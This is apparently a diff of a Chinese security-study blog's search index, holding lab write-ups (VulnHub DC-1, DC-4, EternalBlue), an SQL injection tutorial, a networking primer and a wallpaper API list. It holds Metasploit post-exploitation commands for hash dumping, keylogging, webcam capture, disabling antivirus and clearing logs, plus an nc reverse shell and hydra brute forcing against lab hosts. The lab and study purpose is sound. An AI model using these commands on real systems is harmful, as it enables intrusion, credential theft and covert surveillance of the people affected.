@@ -1,6 +1,63 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>VulnHub——DC-1靶机学习记录</title>
+    <url>/2022/09/24/dc1/</url>
+    <content><![CDATA[<h1>关于DC-1</h1>
+<blockquote>
+<p>DC-1是一个专门建造的易受攻击的实验室，目的是获得渗透测试领域的经验。</p>
+<p>它的设计对初学者来说是一个挑战，但它的容易程度将取决于你的技能和知识，以及你的学习能力。</p>
+<p>要成功完成此挑战，您需要Linux技能，熟悉Linux命令行并具有基本渗透测试工具的经验，例如可以在Kali Linux或鹦鹉安全操作系统上找到的工具。</p>
+<p>有多种方法可以获得root，但是，我提供了一些包含初学者线索的标志。</p>
+<p>总共有五个标志，但最终目标是在 root 的主目录中查找并读取该标志。您甚至不需要成为root才能执行此操作，但是，您将需要root权限。</p>
+<p>根据您的技能水平，您可以跳过查找大多数这些标志并直接进入root。</p>
+<p>初学者可能会遇到他们以前从未遇到过的挑战，但是Google搜索应该是获取完成此挑战所需的信息所需的全部内容。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>DC- 1</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>发布日期</td>
+<td>2019年2月28日</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>DCAU</td>
+</tr>
+<tr>
+<td>系列</td>
+<td>DC</td>
+</tr>
+<tr>
+<td>网页</td>
+<td><a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></td>
+</tr>
+</tbody>
+</table>
+<h1>环境</h1>
+<p>靶机：DC-1（IP:192.168.）</p>
+<p>攻击机：KALI（IP:192.168.3.96）</p>
+<p>平台：VMware 16.2.4</p>
+<h1>信息收集</h1>
+<p><strong>主机发现</strong></p>
+<p><code>arp-scan -l</code></p>
+<hr>
+<p>待更新</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Metasploitable2靶机学习记录</title>
     <url>/2022/10/02/Metasploitable2/</url>
     <content><![CDATA[<h1>关于Metasploitable2</h1>
@@ -201,6 +258,439 @@
       </tags>
   </entry>
   <entry>
+    <title>随机背景API接口整理</title>
+    <url>/2022/03/20/backgroundAPI/</url>
+    <content><![CDATA[<h1>废话不多说，上图！（每次刷新都不一样哦~）</h1>
+<p>（API链接在后面）</p>
+<p><img src="https://api.mtyqx.cn/api/random.php" alt=""></p>
+<p><img src="https://api.mtyqx.cn/tapi/random.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/api/api.php" alt=""></p>
+<p><img src="https://api.ixiaowai.cn/mcapi/mcapi.php" alt=""></p>
+<p><img src="https://acg.toubiec.cn/random.php" alt=""></p>
+<p><img src="https://www.dmoe.cc/random.php" alt=""></p>
+<p><img src="https://api.paugram.com/wallpaper/?source=sina&amp;category=us" alt=""></p>
+<h1>API接口链接</h1>
+<h2 id="必应壁纸">必应壁纸</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.dujin.org/bing/1366.php (1366*768)</span><br><span class="line">https://api.dujin.org/bing/1920.php (1920*1080)</span><br><span class="line">https://api.dujin.org/bing/m.php    (1080*1920)</span><br><span class="line">//api.timecdn.cn/libs/wallpaper/v1  (1920*1080)</span><br></pre></td></tr></tbody></table></figure>
+<p><img src="http://api.timecdn.cn/libs/wallpaper/v1" alt=""></p>
+<center>今日必应壁纸</center>
+<h2 id="野生动漫-API">野生动漫 API</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://api.mtyqx.cn/api/random.php</span><br><span class="line">https://api.mtyqx.cn/tapi/random.php</span><br></pre></td></tr></tbody></table></figure>
+<h2 id="系列-API（需自己按照网站说明调用-API-参数）">系列 API（需自己按照网站说明调用 API 参数）</h2>
+<blockquote>
+<p>小歪 API</p>
+<p><a href="https://api.ixiaowai.cn/">https://api.ixiaowai.cn</a></p>
+</blockquote>
+<blockquote>
+<p>未知名称动漫 API</p>
+<p><a href="https://acg.toubiec.cn/">https://acg.toubiec.cn</a></p>
+</blockquote>
+<blockquote>
+<p>樱花 API</p>
+<p><a href="http://www.dmoe.cc/">http://www.dmoe.cc/</a></p>
+</blockquote>
+<blockquote>
+<p>岁月小筑随机背景 API</p>
+<p><a href="https://img.xjh.me/">https://img.xjh.me</a></p>
+</blockquote>
+<blockquote>
+<p>保罗 API</p>
+<p><a href="https://api.paugram.com/help/wallpaper/">https://api.paugram.com/help/wallpaper/</a></p>
+</blockquote>
+<blockquote>
+<p>樱道随机图片</p>
+<p><a href="https://img.r10086.com/">https://img.r10086.com/</a></p>
+</blockquote>
+<blockquote>
+<p>墨天逸</p>
+<p><a href="http://api.mtyqx.cn/">http://api.mtyqx.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Unsplash</p>
+<p><a href="https://source.unsplash.com/">https://source.unsplash.com/</a></p>
+</blockquote>
+<blockquote>
+<p>后宫漫图：</p>
+<p><a href="https://acg.sx/images">https://acg.sx/images</a></p>
+</blockquote>
+<blockquote>
+<p>EEEDOG</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>东方 Project</p>
+<p><a href="https://img.paulzzh.tech/">https://img.paulzzh.tech/</a></p>
+</blockquote>
+<blockquote>
+<p>搏天 API</p>
+<p><a href="https://api.btstu.cn/doc/sjbz.php">https://api.btstu.cn/doc/sjbz.php</a></p>
+</blockquote>
+<blockquote>
+<p>汐岑 ACG</p>
+<p><a href="https://acg.yanwz.cn/">https://acg.yanwz.cn</a></p>
+</blockquote>
+<blockquote>
+<p>凌一 API</p>
+<p><a href="https://api.lyiqk.cn/">https://api.lyiqk.cn</a></p>
+</blockquote>
+<blockquote>
+<p>Lorem Picsum</p>
+<p><a href="https://picsum.photos/">https://picsum.photos/</a></p>
+</blockquote>
+<blockquote>
+<p>API 接口文档 - 夏沫博客</p>
+<p><a href="https://cdn.seovx.com/">https://cdn.seovx.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Ushio API</p>
+<p><a href="https://www.eee.dog/tech/rand-pic-api.html">https://www.eee.dog/tech/rand-pic-api.html</a></p>
+</blockquote>
+<blockquote>
+<p>点滴 API</p>
+<p><a href="https://api.ddkjt.com/">https://api.ddkjt.com/</a></p>
+</blockquote>
+<blockquote>
+<p>Langford’s API</p>
+<p><a href="https://api.ucany.net/">https://api.ucany.net/</a></p>
+</blockquote>
+<blockquote>
+<p>一铭 API</p>
+<p><a href="https://api.wer.plus/product/doc?id=2">https://api.wer.plus/product/doc?id=2</a></p>
+<p><a href="https://api.wer.plus/product/doc?id=3">https://api.wer.plus/product/doc?id=3</a></p>
+</blockquote>
+<blockquote>
+<p>R0A1NG’s API<br>
+<a href="https://api.roaing.com/#/doc/dongmanimg">https://api.roaing.com/#/doc/dongmanimg</a></p>
+</blockquote>
+<blockquote>
+<p>JacksonXE の API<br>
+<a href="https://api.jacksonxe.cn/api/file/random?sole=">https://api.jacksonxe.cn/api/file/random?sole=</a></p>
+</blockquote>
+<div class="tag link"><a class="link-card" title="随机壁纸API整理" href="https://quest.myxxts.club/archives/54/"><div class="left"><img src="https://sdn.geekzu.org/avatar/b78149ae3a65c308a991d61840da7225?s=&amp;r=&amp;d="></div><div class="right"><p class="text">随机壁纸API整理</p><p class="url">https://quest.myxxts.club/archives/54/</p></div></a></div>
+]]></content>
+      <categories>
+        <category>博客</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>SQL注入漏洞（一）</title>
+    <url>/2022/02/16/SQL1/</url>
+    <content><![CDATA[<h1>SQL 注入漏洞简介</h1>
+<h2 id="SQL-注入漏洞产生原因及危害">SQL 注入漏洞产生原因及危害</h2>
+<p>SQL 注入漏洞是指攻击者通过浏览器或者其他客户端将恶意 SQL 语句插入到网站参数中,而网站应用程序末对其进行过滤,将恶意 SQL语句带入数据库使恶意 SQL 语句得以执行,从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。<br>
+SQL 注入漏洞可能会造成服务器的数据库信息泄露、数据被窃取、网页被篡改,甚至可能会造成网站被挂马、服务器被远程控制、被安装后门等。</p>
+<h2 id="SQL-注入漏洞示例代码分析">SQL 注入漏洞示例代码分析</h2>
+<p>以下是 SQL 注入漏洞的示例代码：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql-"SELECT * FROM users WHBRE id=$id LIMIT O,1";</span><br><span class="line">$result=mysql_query(fsql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>中间件通过 <code>$_GET['id']</code> 获取用户输入的 id 参数的值,并赋值给<code>$id</code> 这个变量。<code>$id</code> 在后面没有经过任何过滤,直接拼接到 SQL 语句中,然后在数据库中执行了此 SQL 语句。<br>
+如果用户提交 <code>index.php?id=1 and 1=1</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>，会有正常的结果返回。<br>
+如果用户提交 <code>index.php?id=1 and 1=2</code>，那么后面的 SQL 语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>，会有不正常的结果返回。</p>
+<h2 id="SQL注入分类">SQL注入分类</h2>
+<p>SQL注入按照数据类型分为<span class="p red">数字型注入</span>和<span class="p red">字符型注入</span>。注入点的数据类型为数字型时为数字型注入,注入点的数据类型为字符型时为字符型注入。<br>
+SQL注入按照服务器返回信息是否显示分为报错注入和盲注。如果在注入的过程中,程序将获取的信息或者报错信息直接显示在页面中,这样的注入为报错注入;如果在注入的过程中,程序不显示任何SQL报错信息,只能通过精心构造SQL语句,根据页面是否正常返回或者返回的时间判断注入的结果,这样的注入为盲注。</p>
+<h1>数字型注入</h1>
+<p>数字型注入就是注入点的数据类型是数字型,没有用单引号引起来。数字型注入的典型示例代码如下:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";    //$id没有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>在 <code>WHERE id=$id</code>这个SQL语句的子句中,<code>$id</code>变量没有用单引号或者双引号引起来,而是直接拼接到了后面,这样的注入就是典型的数字型注入。</p>
+<h2 id="判断数字型注入的方法如下">判断数字型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入and-1-1-正常返回。">输入<code>and 1=1</code>,正常返回。</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入and-1-2-不正常返回">输入<code>and 1=2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 and 1=2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1</code>,会有不正常的结果返回。<br>
+数字型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在数字型注入。具体有没有数字型注入,是否可以通过数字型注入获取有效信息,还需要大量的测试来验证。</p>
+<h1>字符型注入</h1>
+<p>字符型注入就是注入点的数据类型是字符型。字符型注入与数字型注入的区别就是字符型注入要用一对单引号引起来。字符型注入的典型示例代码如下：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$id=$_GET['id'];</span><br><span class="line">$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";    //'$id'有单引号</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row=mysql_fetch_array($result);</span><br></pre></td></tr></tbody></table></figure>
+<p>这个示例代码与数字型注入的示例代码基本一致,只是在后面的SQL语句拼接中,<code>$id</code>多了一对单引号,<code>$id</code>是字符型数据,这就是典型的字符型注入。</p>
+<h2 id="判断字符型注入的方法如下">判断字符型注入的方法如下:</h2>
+<h3 id="输入单引号-不正常返回。-v2">输入单引号,不正常返回。</h3>
+<p>如果用户提交 <code>index,php?id=1'</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id=1' LIMIT 0,1</code>,SQL语句本身存在语法错误,会有不正常的结果返回。</p>
+<h3 id="输入-and-1-1-正常返回">输入<code>'and'1'='1</code>,正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='1</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='1' LIMIT 0,1</code>,会有正常的结果返回。</p>
+<h3 id="输入-and-1-2-不正常返回">输入<code>'and'1'='2</code>,不正常返回</h3>
+<p>如果用户提交 <code>index.php?id=1 'and' 1'='2</code>,那么后面的SQL语句就变为 <code>SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1</code>,会有不正常的结果返回。<br>
+字符型注入的注入点主要通过上面3个语句来判断,如果输入的返回结果与上面相符,说明测试语句中的恶意SQL语句被带入数据库中并且成功执行,那么就可能存在字符型注入。具体有没有字符型注入,是否可以通过字符型注入获取有效信息,还需要大量的测试来验证。</p>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>IP地址详解</title>
+    <url>/2022/03/17/cgrona1/</url>
+    <content><![CDATA[<h1>0x01 IP（IPv4）</h1>
+<p>IP地址是唯一的标识，分为a、b、c、d四个字段，形式为X.X.X.X，每个字段都由32位的二进制数字构成，所以每个字段范围都是0-255（但我们可以使用的IP不包括0和255）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：10.2.1.1 、 192.168.1.1</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x02 子网掩码</h1>
+<ol>
+<li><strong>局域网通信规则</strong>：在同一局域网中，所有的IP必须在同一网段中才可以互相通信</li>
+<li><strong>IP地址构成</strong>：网络位+主机位（网络位相同的IP地址，属于同一网段）</li>
+<li><strong>子网掩码</strong>：每一个IP地址必须配一个子网掩码，用来确定IP地址的网络位</li>
+</ol>
+<p><strong>子网掩码如何确定网络位</strong>：与<strong>255</strong>对应的数字为<strong>网络位</strong>，与<strong>0</strong>对应的数字为<strong>主机位</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">255.0.0.0  、 255.255.0.0  、 255.255.255.0</span><br><span class="line">PLAINTEXT</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.0.0.0</span><br><span class="line">则10.1.1.1属于10.0.0.0这个网段，主机名字叫1.1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.0.0</span><br><span class="line">则10.1.1.1属于10.1.0.0这个网段，主机名字叫1.1</span><br><span class="line"></span><br><span class="line">10.1.1.1   255.255.255.0</span><br><span class="line">则10.1.1.1属于10.1.1.0这个网段，主机名字叫1</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x03 IP地址详解</h1>
+<p>IP地址分为五大类（以IP地址的第一位进行区分）</p>
+<ul>
+<li><strong>A类</strong>： <strong>1-126</strong> 默认子网掩码：255.0.0.0</li>
+<li><strong>B类</strong>：<strong>128-191</strong> 默认子网掩码：255.255.0.0</li>
+<li><strong>C类</strong>：<strong>192-223</strong> 默认子网掩码：255.255.255.0</li>
+<li><strong>D类</strong>：<strong>224-239</strong> 组播地址</li>
+<li><strong>E类</strong>：<strong>240-254</strong> 科研使用</li>
+</ul>
+<p>注：</p>
+<p>1、目前我们可以使用的只有A、B、C 三类</p>
+<p>2、A、B、C 三类的子网掩码可以修改</p>
+<h2 id="3-1-127开头">3.1 127开头</h2>
+<p>这个开头只有一个地址：**127.0.0.1：**本地回环地址（永远代表自己）</p>
+<p>Ping这个地址代表跟自己通信（Ping它等于Ping自己）</p>
+<h2 id="3-2-广播地址">3.2 广播地址</h2>
+<p>主机位上全为255即为广播地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">如：</span><br><span class="line">10.1.1.1  255.255.0.0</span><br><span class="line">这个IP属于10.1.0.0这个网段，那么把主机位、或者说0这个位置全都换成255就是广播地址:10.1.255.255就是这个IP的广播地址</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x04 网关</h1>
+<p><strong>网关（Gateway）</strong>：网络的出口，可以使不在同一个网段的IP通信，一般在路由器上</p>
+<p>通俗来讲就是访问互联网的通道</p>
+<p>路由器：可用连接内外网的设备</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">主机与主机之间互相通信:</span><br><span class="line">	首先判断目标IP地址与自己是否处在同一网段</span><br><span class="line">	若在同一网段，则直接发出去，而不找网关</span><br><span class="line">	若不在同一网段，则直接发包给网关</span><br></pre></td></tr></tbody></table></figure>
+<h1>0x05 DNS</h1>
+<p>DNS：Domain Name Service 域名服务</p>
+<p>用于<strong>解析网站域名</strong></p>
+<p>通过浏览器使用域名访问互联网：</p>
+<ul>
+<li>浏览器会先找是否有本地缓存（也就是之前是否访问过该网站）</li>
+<li>接着会找位于 C 盘的本地解析文件（host文件）</li>
+<li>本地没有的话，浏览器会向DNS服务器发起解析请求</li>
+</ul>
+<p>若直接访问 IP 地址的话则不需要DNS服务</p>
+<p>通过命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nslookup www.baidu.com</span><br></pre></td></tr></tbody></table></figure>
+<p>可以查询该网址的 IP 地址以及帮你进行解析的 DNS</p>
+<p><a href="https://cgrona.top/2022/01/09/study/1.png"><img src="https://cgrona.vercel.app/2022/01/09/study/1.png" alt="img"></a></p>
+<h1>0x06 网络测试命令</h1>
+<ul>
+<li>
+<p>如何查看IP地址</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ipconfig # 查看IP地址基本信息</span><br><span class="line">ipconfig /all # 查看IP地址详细信息</span><br></pre></td></tr></tbody></table></figure>
+</li>
+<li>
+<p>测试网络连通性</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">ping 目标IP地址 # 测试网络连通性，有回复即为可以成功通信</span><br><span class="line">ping -t 目标IP地址 # 一直ping</span><br><span class="line">ping -n 目标IP地址 # 修改ping包的数量</span><br><span class="line"></span><br><span class="line">注:若ping不通，可能对方不在线，或者对方开着防火墙</span><br></pre></td></tr></tbody></table></figure>
+</li>
+</ul>
+]]></content>
+      <categories>
+        <category>转载</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>永恒之蓝漏洞复现</title>
+    <url>/2022/04/21/eternalblue/</url>
+    <content><![CDATA[<h1>漏洞描述：</h1>
+<p>Eternalblue通过TCP端口445和139来利用SMBv1和NBT中的远程代码执行漏洞，恶意代码会扫描开放445文件共享端口的Windows机器，无需用户任何操作，只要开机上网，不法分子就能在电脑和服务器中植入勒索软件、远程控制木马、虚拟货币挖矿机等恶意程序。</p>
+<h1>影响版本：</h1>
+<p>目前已知受影响的Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0。</p>
+<h1>复现环境：</h1>
+<p>攻击机：Linux Kali （192.168.8.242）</p>
+<p>靶机：Windows7 x64 （192.168.8.172）</p>
+<h1>复现过程：</h1>
+<h2 id="主机发现">主机发现</h2>
+<p>用nmap探测本网段存活主机 <code>nmap 192.168.8.17</code></p>
+<p><img src="https://img.anineg.space/1.png" alt="1"></p>
+<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
+<h2 id="进入MSF框架">进入MSF框架</h2>
+<p>执行<code>msfconsole</code></p>
+<p><img src="https://img.anineg.space/2.png" alt="2"></p>
+<p>ms17-010代码 msf6 &gt; <code>search ms17_010</code></p>
+<p><img src="https://img.anineg.space/3.png" alt="3"></p>
+<p>在这里可以看到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块,探测主机是否存在MS17_010漏洞，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，前者扫描漏洞，后者进行攻击。</p>
+<h2 id="使用ms17-010扫描模块">使用ms17-010扫描模块</h2>
+<p>msf6 &gt; <code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
+<p><img src="https://img.anineg.space/4.png" alt="4"></p>
+<p>在Required一栏中显示yes的需要填写Current Setting项</p>
+<p>如 <code>set rhosts 192.168.8.172</code></p>
+<p>执行扫描 <code>run</code></p>
+<p><img src="https://img.anineg.space/5.png" alt="5"></p>
+<p>显示可能存有永恒之蓝漏洞。</p>
+<h2 id="使用ms17-010攻击模块">使用ms17-010攻击模块</h2>
+<p>msf6 &gt; <code>use exploit/windows/smb/ms17_010_eternalblue</code></p>
+<p>查看模块需要配置的参数  <code>show options  </code></p>
+<p><img src="https://img.anineg.space/6.png" alt="6"></p>
+<p>同理，设置目标IP ：<code>set rhosts 192.168.8.172</code></p>
+<p>设置用于接收从目标机弹回来的shell：<code>set  LHOST 192.168.1.11</code></p>
+<p>执行攻击 <code>run</code></p>
+<p><img src="https://img.anineg.space/7.png" alt="7"></p>
+<center>攻击成功！</center>
+<hr>
+<h2 id="后渗透阶段">后渗透阶段</h2>
+<p>使用<code>shell</code>可以进入被攻击机的Windows shell，但会有乱码。使用<code>chcp 65001</code>，改变代码页（65001为UTF-8的代码页）即恢复正常。</p>
+<p><img src="https://img.anineg.space/8.png" alt="8"></p>
+<p>使用<code>screenshot</code>进行截屏</p>
+<p><img src="https://img.anineg.space/9.png" alt="9"></p>
+<p>想从目标主机shell退出到 meterpreter ，输入：<code>exit</code></p>
+<p>要想从 meterpreter 退出到MSF框架，输入：<code>background</code></p>
+<h2 id="更多操作">更多操作</h2>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sysinfo             #查看目标主机系统信息</span><br><span class="line">run scraper         #查看目标主机详细信息</span><br><span class="line">run hashdump        #导出密码的哈希</span><br><span class="line">load kiwi           #加载</span><br><span class="line">ps                  #查看目标主机进程信息</span><br><span class="line">pwd                 #查看目标当前目录(windows)</span><br><span class="line">getlwd              #查看目标当前目录(Linux)</span><br><span class="line">search -f *.jsp -d e:\                #搜索E盘中所有以.jsp为后缀的文件</span><br><span class="line">download  e:\test.txt  /root          #将目标机的e:\test.txt文件下载到/root目录下</span><br><span class="line">upload    /root/test.txt d:\test      #将/root/test.txt上传到目标机的 d:\test\ 目录下getpid              #查看当前Meterpreter Shell的进程</span><br><span class="line">PIDmigrate 1384     #将当前Meterpreter Shell的进程迁移到PID为1384的进程上</span><br><span class="line">idletime            #查看主机运行时间</span><br><span class="line">getuid              #查看获取的当前权限</span><br><span class="line">getsystem           #提权</span><br><span class="line">run  killav         #关闭杀毒软件</span><br><span class="line">screenshot          #截图</span><br><span class="line">webcam_list         #查看目标主机的摄像头</span><br><span class="line">webcam_snap         #拍照</span><br><span class="line">webcam_stream       #开视频</span><br><span class="line">execute  参数  -f 可执行文件   #执行可执行程序</span><br><span class="line">run getgui -u hack -p 123    #创建hack用户，密码为123</span><br><span class="line">run getgui -e                #开启远程桌面</span><br><span class="line">keyscan_start                #开启键盘记录功能</span><br><span class="line">keyscan_dump                 #显示捕捉到的键盘记录信息</span><br><span class="line">keyscan_stop                 #停止键盘记录功能</span><br><span class="line">uictl  disable  keyboard     #禁止目标使用键盘</span><br><span class="line">uictl  enable   keyboard     #允许目标使用键盘</span><br><span class="line">uictl  disable  mouse        #禁止目标使用鼠标</span><br><span class="line">uictl  enable   mouse        #允许目标使用鼠标</span><br><span class="line">load                         #使用扩展库</span><br><span class="line">run				             #使用扩展库</span><br><span class="line">run persistence -X -i 5 -p 8888 -r 192.168.10.27        #反弹时间间隔是5s 会自动连接</span><br><span class="line">                                   192.168.27的4444端口，缺点是容易被杀毒软件查杀</span><br><span class="line">portfwd add -l 3389 -r 192.168.11.13 -p 3389     #将192.168.11.13的3389端口转发到本地的3389端口上，这里的192.168.11.13是获取权限的主机的ip地址</span><br><span class="line">clearev                       #清除日志</span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">run post/windows/manage/migrate                  #自动进程迁移     </span><br><span class="line">run post/windows/gather/checkvm                  #查看目标主机是否运行在虚拟机上     </span><br><span class="line">run post/windows/manage/killav                   #关闭杀毒软件     </span><br><span class="line">run post/windows/manage/enable_rdp               #开启远程桌面服务     </span><br><span class="line">run post/windows/manage/autoroute                #查看路由信息     </span><br><span class="line">run post/windows/gather/enum_logged_on_users     #列举当前登录的用户     </span><br><span class="line">run post/windows/gather/enum_applications        #列举应用程序     </span><br><span class="line">run windows/gather/credentials/windows_autologin #抓取自动登录的用户名和密码     </span><br><span class="line">run windows/gather/smart_hashdump                #dump出所有用户的hash</span><br></pre></td></tr></tbody></table></figure>
+]]></content>
+      <categories>
+        <category>学习笔记</category>
+      </categories>
+      <tags>
+        <tag>靶机</tag>
+        <tag>渗透</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>VulnHub——DC-4靶机学习记录</title>
+    <url>/2022/07/25/dc4/</url>
+    <content><![CDATA[<h1>关于DC-4</h1>
+<blockquote>
+<p>DC-4是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。</p>
+<p>与以前的DC版本不同，此版本主要为初学者/中级版本而设计。只有一个标志，但从技术上讲，有多个入口点，就像上次一样，没有线索。</p>
+<p>Linux技能和对Linux命令行的熟悉程度是必须的，基本的渗透测试工具的一些经验也是必须的。</p>
+<p>对于初学者来说，Google可以提供很大的帮助，但你可以随时在@DCAU7上发推文给我，寻求帮助，让你再次前进。但请注意：我不会给你答案，相反，我会给你一个关于如何前进的想法。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>DC- 4</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>发布日期</td>
+<td>2019年4月7日</td>
+</tr>
+<tr>
+<td>作者</td>
+<td>DCAU</td>
+</tr>
+<tr>
+<td>系列</td>
+<td>DC</td>
+</tr>
+<tr>
+<td>网页</td>
+<td><a href="https://www.vulnhub.com/entry/dc-4,313/">https://www.vulnhub.com/entry/dc-4,313/</a></td>
+</tr>
+</tbody>
+</table>
+<h1>环境</h1>
+<p>靶机：DC-4（IP:未知）</p>
+<p>攻击机：KALI（IP:192.168.3.96）</p>
+<p>平台：VMware 16.2.4</p>
+<h1>信息收集</h1>
+<p><strong>主机发现</strong></p>
+<p><code>arp-scan -l</code></p>
+<p><img src="https://img.anineg.space/scan1.png" alt="scan1"></p>
+<p><strong>使用nmap进行扫描主机</strong></p>
+<p><code>nmap -sS -Pn -A -p- -n 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/nmapss.png" alt="nmapss"></p>
+<p><code>nmap -sV -p- 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/nmapsv.png" alt="nmapsv"></p>
+<p><strong>web指纹识别</strong></p>
+<p><code>whatweb -v 192.168.3.95</code></p>
+<p><img src="https://img.anineg.space/whatweb.png" alt="whatweb"></p>
+<p><strong>网站目录扫描</strong></p>
+<p><code>dirb http://192.168.3.95 /usr/share/dirb/wordlists/big.txt</code></p>
+<p><img src="https://img.anineg.space/dirb.png" alt="dirb"></p>
+<h2 id="收集到的信息：">收集到的信息：</h2>
+<ul>
+<li>
+<p>靶机IP =&gt; 192.168.3.95</p>
+</li>
+<li>
+<p>开放的端口：</p>
+<ul>
+<li>22 =&gt; ssh服务 ---- OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</li>
+<li>80 =&gt; http服务 ---- nginx 1.15.10</li>
+</ul>
+<hr>
+</li>
+</ul>
+<h1>渗透测试</h1>
+<p>尝试用hydra进行爆破</p>
+<p><code>hydra -l root -P /root/top1000.txt -vV -t 10 -o ssh.txt 192.168.15.152 ssh -s 22</code></p>
+<p><img src="https://img.anineg.space/hydra1.png" alt="hydra1"></p>
+<p>爆不出来，先去网页端看一看有什么有用的信息。</p>
+<p>访问<code>http://192.168.3.95/</code></p>
+<p><img src="https://img.anineg.space/0010.png" alt="0010"></p>
+<p>打开网页，是一个登录界面，开始用BP进行爆破，得到密码：</p>
+<blockquote>
+<p>happy</p>
+</blockquote>
+<p><img src="https://img.anineg.space/baopo.png" alt="baopo"></p>
+<p>登录进入，发现有可以执行命令的地方：</p>
+<p><img src="https://img.anineg.space/login.png" alt="login"></p>
+<p><img src="https://img.anineg.space/run.png" alt="run"></p>
+<p>使用BP进行抓包，发现可以修改命令：</p>
+<p><img src="https://img.anineg.space/bp1.png" alt="bp1"></p>
+<p><img src="https://img.anineg.space/bp2.png" alt="bp2"></p>
+<p><img src="https://img.anineg.space/fire1.png" alt="fire1"></p>
+<p>先执行一个反弹shell的命令：<code>nc -e /bin/bash 192.168.3.95 4444</code></p>
+<p>执行之前现在kali上监听4444端口：<code>nc -lnvp 4444</code></p>
+<p><img src="https://img.anineg.space/listen.png" alt="listen"></p>
+<p><img src="https://img.anineg.space/bp4.png" alt="bp4"></p>
+<p>getshell成功：</p>
